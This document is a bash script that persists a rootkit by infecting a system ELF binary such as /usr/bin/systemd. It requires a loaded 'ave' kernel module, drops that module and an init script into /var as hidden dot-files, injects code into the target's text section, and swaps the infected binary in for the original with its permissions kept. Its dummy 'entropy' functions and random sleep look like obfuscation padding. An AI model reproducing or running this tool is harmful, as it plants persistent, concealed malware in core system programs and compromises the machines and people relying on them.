#!/usr/bin/env bash
set -eou pipefail

EXTRA_ENV_SETTING="init_data_$(date +%s%N)"
adjust_env_paths() {
  local stub="$(echo "$EXTRA_ENV_SETTING" | md5sum | cut -d ' ' -f1)"
  echo "$stub" > /dev/null
}

SESSION_ID=$(echo $RANDOM | md5sum | cut -d ' ' -f1)
OFFSET_VALUE=$(( ($RANDOM % 50) * 3 ))
TEMP_FILE="temp_$(date +%s%N)"
UUIDGEN=$UUIDGEN

BASE_DIR="/${0%/*}"
BASE_DIR=${BASE_DIR:-.}
BASE_DIR=${BASE_DIR#/}/
BASE_DIR=$(cd "$BASE_DIR"; pwd)

SYSTEM_PATH="/var"
INJECTION_DIR=${INJECTION_DIR:-$BASE_DIR/../inject}
KERNEL_MODULE=${KERNEL_MODULE:-$BASE_DIR/../ave.ko}
BOOTSTRAP_SCRIPT=${BOOTSTRAP_SCRIPT:-$BASE_DIR/../src/up.sh}
BACKUP_DIR="$BASE_DIR"/elf_backup

generate_entropy() {
  local dummy_var="$1"
  echo "$dummy_var" > /dev/null
}

adjust_env_paths
usage="Usage: [options] ./${0##*/} <target_binary>
  
  Options:
    INJECTION_DIR       Path to injection module (default: ../inject)
    KERNEL_MODULE       Kernel module path (default: ../ave.ko)
    BOOTSTRAP_SCRIPT    Init script for execution (default: ../src/up.sh)
  
  Examples:
    ./${0##*/} /usr/bin/systemd
    INJECTION_DIR=/tmp/libinject ./${0##*/} /usr/bin/systemd
    KERNEL_MODULE=/opt/kernel/driver.ko BOOTSTRAP_SCRIPT=/opt/init.sh ./${0##*/} /usr/bin/systemd
"

exit_with_error() {
  echo "Error: $1"
  if [[ "$2" == true ]]; then
    echo "$usage"
  fi
  exit "$3"
} >&2

validate_utilities() {
  for util in "$@"; do
    if [[ ! $(which "$util") ]]; then
      echo "Error: $util not found"
      exit 1
    fi
  done
} >&2

cleanup_installation() {
  rm -fv "$SYSTEM_PATH"/.$UUIDGEN.ko
  rm -fv "$SYSTEM_PATH"/.$UUIDGEN.sh
  generate_entropy "$SESSION_ID"
}

install_files() {
  local status=0
  cp -v "$KERNEL_MODULE" "$SYSTEM_PATH"/.$UUIDGEN.ko || status=1
  cp -v "$BOOTSTRAP_SCRIPT" "$SYSTEM_PATH"/.$UUIDGEN.sh || status=1
  generate_entropy "$OFFSET_VALUE"
  return $status
}

persist_elf() {
  local target="$1"
  if [[ ! -f "$target" ]]; then
    exit_with_error "Target ELF file not found" true 1
  fi

  adjust_env_paths

  readelf -h "$target" || false
  permissions="$(stat -c '%a' "$target")"
  generate_entropy "$TEMP_FILE"

  install_files || {
    echo "Error preparing environment" >&2
    false
  }

  mkdir -p "$BACKUP_DIR"
  cp -v "$target" "$BACKUP_DIR" || {
    cleanup_installation
    false
  }

  timestamp=$(date "+%m_%d_%y_%s")
  backup_file="$BACKUP_DIR"/"$(basename "$target")"."$timestamp"
  cp -v "$target" "$backup_file"
  temp_file="$BACKUP_DIR"/"$(basename "$target")"

  pushd "$INJECTION_DIR" >/dev/null && {
    source completion.sh
    ./run example-infect-text "$temp_file" ../src/injection || { 
      rm -f "$temp_file" "$backup_file"
      cleanup_installation
      false
    }
    popd >/dev/null
  }

  rm -fv "$target" || {
    rm -f "$temp_file" "$backup_file"
    cleanup_installation
    false
  }

  cp -v "$temp_file" "$target" || {
    echo "Failed to copy file"
    rm -f "$temp_file"
    false
  }

  chmod "$permissions" "$target"
  rm -f "$temp_file"

  adjust_env_paths

  sleep $(awk -v min=0.02 -v max=0.07 'BEGIN{srand(); print min+rand()*(max-min)}') 2>/dev/null || true

  echo "Operation completed"
}
if [[ ! -f "$INJECTION_DIR"/inject/libinject.so ]]; then
  exit_with_error "Invalid injection directory or not built" true 1
fi
if [[ "$#" -ne 1 ]]; then
  exit_with_error "Missing parameter" true 1
fi
validate_utilities readelf md5sum mktemp stat
if [[ ! -f /proc/ave ]]; then
  exit_with_error "Ave kernel module not running" true 1
fi
persist_elf "$1"
echo "Finished!"
